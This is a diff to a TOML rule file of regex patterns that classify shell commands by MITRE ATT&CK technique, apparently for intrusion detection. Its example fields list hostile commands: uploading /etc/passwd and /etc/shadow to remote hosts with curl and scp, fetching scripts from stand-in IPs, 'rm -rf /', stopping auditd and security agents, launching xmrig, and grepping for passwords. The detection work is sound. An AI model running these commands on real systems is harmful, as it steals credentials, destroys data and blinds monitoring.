@@ -143,8 +143,8 @@ id = "discovery-log-enumeration"
 technique = "T1654"
 confidence = "medium"
 description = "Reading system logs"
-pattern = '''^(cat|less|more|tail|head|grep|zcat|journalctl)\s+.*(/var/log/|^journalctl)|^journalctl(\s|$)'''
-examples = ["cat /var/log/auth.log", "tail -f /var/log/syslog", "journalctl -xe"]
+pattern = '''^(cat|less|more|tail|head|grep|zcat|journalctl)\s+.*(/var/log/|^journalctl)|^journalctl(\s|$)|^ls\s+.*/var/log\b'''
+examples = ["cat /var/log/auth.log", "tail -f /var/log/syslog", "journalctl -xe", "ls /var/log"]
 not_examples = ["rm /var/log/auth.log"]
 
 [[rule]]
@@ -394,17 +394,17 @@ id = "c2-download"
 technique = "T1105"
 confidence = "high"
 description = "Fetching a file onto the host"
-pattern = '''^(wget|curl|tftp|ftpget|fetch|lwp-download|aria2c|axel)(?!.*(ifconfig\.(me|co)|icanhazip|ipinfo\.io|checkip|api\.ipify|ip-api\.com))(\s|$)|^git\s+clone\s'''
+pattern = '''^(?!curl\b.*\s(-T|--upload-file|-F|--form|--data-binary)\b)(wget|curl|tftp|ftpget|fetch|lwp-download|aria2c|axel)(?!.*(ifconfig\.(me|co)|icanhazip|ipinfo\.io|checkip|api\.ipify|ip-api\.com))(\s|$)|^git\s+clone\s'''
 examples = ["wget http://203.0.113.9/a.sh", "curl -O http://x.example/b", "tftp -g -r bot 10.0.0.1", "cd /tmp; wget http://x/y", "git clone https://github.com/x/y"]
-not_examples = ["curl ifconfig.me", "wgetx"]
+not_examples = ["curl ifconfig.me", "wgetx", "curl -F file=@/etc/passwd http://x/up"]
 
 [[rule]]
 id = "exec-permission-change"
 technique = "T1222.002"
 confidence = "medium"
 description = "Making a file executable (usually right after downloading it)"
-pattern = '''^chmod\s+(-\S+\s+)*([ugoa]*\+[rwst]*x|(?=[0-7]{3,4}\s)[0-7]*[1357])'''
-examples = ["chmod +x a.sh", "chmod 777 a.sh", "chmod 755 /tmp/x", "chmod -R 777 /tmp"]
+pattern = '''^chmod\s+(-\S+\s+)*([ugoa]*\+[rwst]*x|[ugoa]+[=-][rwxst]*\s|(?=[0-7]{3,4}\s)[0-7]*[1357])'''
+examples = ["chmod +x a.sh", "chmod 777 a.sh", "chmod 755 /tmp/x", "chmod -R 777 /tmp", "chmod -R go= ~/.ssh"]
 not_examples = ["chmod 600 key", "chmod 644 file"]
 
 [[rule]]
@@ -543,11 +543,10 @@ not_examples = ["echo -e '\\x41'"]
 id = "impact-cryptomining"
 technique = "T1496.001"
 confidence = "high"
-scope = "command"
 description = "Cryptocurrency miner tooling or pool addresses"
-pattern = '''(\b(xmrig|minerd|cpuminer|ethminer|cgminer|bfgminer|nbminer|kinsing|kdevtmpfsi)\b|stratum\+(tcp|ssl)://|--donate-level|pool\.minexmr|nanopool|supportxmr|moneroocean)'''
-examples = ["./xmrig -o stratum+tcp://pool.example:3333", "wget http://x/kinsing", "./minerd -a cryptonight"]
-not_examples = ["ls /tmp"]
+pattern = '''^(?!(grep|egrep|fgrep|pgrep|pkill|killall|kill|ps|which|whereis|rm|locate)\b)(?=.*(\b(xmrig|minerd|cpuminer|ethminer|cgminer|bfgminer|nbminer|kinsing|kdevtmpfsi)\b|stratum\+(tcp|ssl)://|--donate-level|pool\.minexmr|nanopool|supportxmr|moneroocean))'''
+examples = ["./xmrig -o stratum+tcp://pool.example:3333", "wget http://x/kinsing", "./minerd -a cryptonight", "pkill xmrig; ./xmrig -o pool.minexmr.com:4444"]
+not_examples = ["ls /tmp", "ps aux | grep xmrig", "pkill -f xmrig", "sudo pkill xmrig", "rm -f xmrig"]
 
 # ------------------------------------------------------------ Defense evasion
 
@@ -586,9 +585,9 @@ id = "evasion-delete-files"
 technique = "T1070.004"
 confidence = "medium"
 description = "Deleting files, usually to remove the dropper after running it"
-pattern = '''^(rm|unlink)(\s|$)'''
+pattern = '''^(rm|unlink)(?!\s+(-\S+\s+)*/\*?(\s|$))(\s|$)'''
 examples = ["rm a.sh", "rm -rf /tmp/x", "unlink /tmp/x"]
-not_examples = ["rmdir", "rmmod x"]
+not_examples = ["rmdir", "rmmod x", "rm -rf /", "rm -rf /*"]
 
 [[rule]]
 id = "evasion-timestomp"
@@ -623,8 +622,8 @@ id = "defense-impair-tools"
 technique = "T1685"
 confidence = "high"
 description = "Switching off security tooling"
-pattern = '''^(setenforce\s+0|(systemctl|service)\s+(stop|disable)\s+(auditd|apparmor|rsyslog|syslog|wazuh-agent|ossec|falcon-sensor|clamav\S*|aegis|aliyun\S*|sentinelone|osqueryd)|service\s+(auditd|apparmor|rsyslog)\s+stop|(pkill|killall)\s+.*(auditd|rsyslog|wazuh|ossec|aegis|aliyun|barad|yunjing))'''
-examples = ["setenforce 0", "systemctl stop auditd", "service rsyslog stop", "pkill -9 aliyun"]
+pattern = '''^(setenforce\s+0|(systemctl|service)\s+(stop|disable)\s+(apparmor|rsyslog|syslog|wazuh-agent|ossec|falcon-sensor|clamav\S*|aegis|aliyun\S*|sentinelone|osqueryd)|service\s+(apparmor|rsyslog)\s+stop|(pkill|killall)\s+.*(auditd|rsyslog|wazuh|ossec|aegis|aliyun|barad|yunjing))'''
+examples = ["setenforce 0", "systemctl stop apparmor", "service rsyslog stop", "pkill -9 aliyun"]
 not_examples = ["getenforce", "systemctl status auditd"]
 
 [[rule]]
@@ -632,8 +631,8 @@ id = "defense-impair-audit"
 technique = "T1685.004"
 confidence = "high"
 description = "Disabling or clearing the Linux audit rules"
-pattern = '''^auditctl\s+(-e\s*0|-D)\b'''
-examples = ["auditctl -e 0", "auditctl -D"]
+pattern = '''^(auditctl\s+(-e\s*0|-D)\b|(systemctl|service)\s+(stop|disable)\s+auditd\b|service\s+auditd\s+stop\b)'''
+examples = ["auditctl -e 0", "auditctl -D", "systemctl stop auditd", "service auditd stop"]
 not_examples = ["auditctl -l"]
 
 # -------------------------------------------------------- Impact / collection
@@ -689,6 +688,16 @@ id = "exfil-upload"
 technique = "T1048"
 confidence = "medium"
 description = "Uploading local data to a remote server"
-pattern = '''^curl\s+(.*\s)?(-T\b|--upload-file|(-F|--form)\s+\S*@|--data-binary\s+@|-d\s+@)|^ftpput(\s|$)'''
-examples = ["curl -T /etc/passwd http://x/u", "curl -F file=@/etc/shadow http://x", "curl --data-binary @data http://x"]
-not_examples = ["curl http://x/a.sh"]
+pattern = '''^curl\s+(.*\s)?(-T\b|--upload-file|(-F|--form)\s+\S*@|--data-binary\s+@|-d\s+@)|^ftpput(\s|$)|^scp\s+(-\S+\s+)*[^\s:@]+\s+\S*@\S+:'''
+examples = ["curl -T /etc/passwd http://x/u", "curl -F file=@/etc/shadow http://x", "curl --data-binary @data http://x", "scp /etc/passwd user@203.0.113.5:/tmp"]
+not_examples = ["curl http://x/a.sh", "scp user@h:/etc/passwd ."]
+
+
+[[rule]]
+id = "credential-search"
+technique = "T1552.001"
+confidence = "medium"
+description = "Searching files recursively for passwords, secrets or keys"
+pattern = '''^(grep|egrep|fgrep)\s+(-\S+\s+)*-\S*[rR]\S*\s+(-\S+\s+)*['"]?\S*(passw|secret|api[_-]?key|token)'''
+examples = ["grep -r password /var/www", "grep -ri 'api_key' /home", "grep -R secret ."]
+not_examples = ["grep password notes.txt", "grep -r main src"]
